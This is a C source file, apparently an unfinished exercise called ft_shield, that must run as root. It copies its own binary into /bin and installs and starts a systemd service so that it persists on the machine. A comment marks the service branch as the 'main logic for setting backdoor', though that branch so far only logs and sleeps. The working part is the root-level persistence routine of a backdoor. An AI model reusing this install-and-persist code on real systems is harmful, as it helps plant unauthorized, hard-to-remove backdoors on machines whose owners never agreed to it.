#include "ft_shield.h"


void server() {
	syslog(LOG_INFO, "server started\n");
	while (1)
	{
		sleep(3);
	}
	syslog(LOG_ERR, "server closed\n");
}

int duplicate(char *exec_path)
{
	int	bin; // file descriptor of /bin/ft_shield
	int	usr; // file descriptor of program that user ran
	int	ret;
	char	buffer[1024];

	bin = open("/bin/ft_shield", O_CREAT | O_WRONLY | O_TRUNC, 755);
	if (bin < 0)
	{
		syslog(LOG_ERR, "failed to write /bin/ft_shield\n");
		return (-1);
	}
	usr = open("/home/s/sh/a.out", O_RDONLY);
	if (usr < 0)
	{
		close(bin);
		syslog(LOG_ERR, "failed to read /home/s/sh/a.out\n");
		return (-2);
	}
	while ((ret = read(usr, buffer, 1024)))
		write(bin, buffer, ret);
	close(bin);
	close(usr);
	syslog(LOG_INFO, "ft_shield duplicated successfully\n");
	return (0);
}

int daemonize()
{
	int fd = open("/etc/systemd/system/ft_shield.service", O_CREAT | O_TRUNC | O_WRONLY, 0755);
	if (fd >= 0)
	{
		syslog(LOG_INFO, "writing an unit: ft_shield.service\n");
		if (write(fd, CONFIG, strlen(CONFIG)) == -1)
		{
			syslog(LOG_ERR, "failed to write systemd service unit\n");
			return -1;
		}
		chmod("/etc/systemd/system/ft_shield.service", 755);
		syslog(LOG_INFO, "systemd starting service\n");
		system("systemctl stop ft_shield");
		system("systemctl daemon-reload");
		system("systemctl start ft_shield");
	}
	else
	{
		// sysVinit
	}
}

int main(int argc, char **argv)
{
	int	len;
	char	exec_path[256];

	if (geteuid())
	{
		printf("root permission required\n");
		return (-1);
	}
	openlog("ft_shield", LOG_PID | LOG_CONS, LOG_USER);
	len = readlink("/proc/self/exe", exec_path, sizeof(exec_path) - 1);
	if (len != -1)
	{
		exec_path[len] = '\0';
		syslog(LOG_INFO, "exec path: %s\n", exec_path);
		// printf("%s\n", exec_path);
	}
	else
	{
		syslog(LOG_ERR, "readlink failed\n");
	}
	// printf("%s == \"/home/s/sh/a.out\"\n", exec_path);
	syslog(LOG_INFO, "/proc/self/exe: %s", exec_path);
	if (strcmp(exec_path, "/home/s/sh/a.out") == 0)
	{
		// ft_shield.out
		if (duplicate(exec_path) < 0) // copy binary to /bin directory
		{
			syslog(LOG_ERR, "failed to duplicate the program\n");
			return -1;
		}
		if (daemonize() < 0)
		{
			syslog(LOG_ERR, "failed to daemonize service\n");
			return -2;
		}
	}
	else
	{
		// ft_shield.service
		// main logic for setting backdoor
		server();
	}
	syslog(LOG_INFO, "process end: %s\n", exec_path);
	closelog();
	return (0);
}
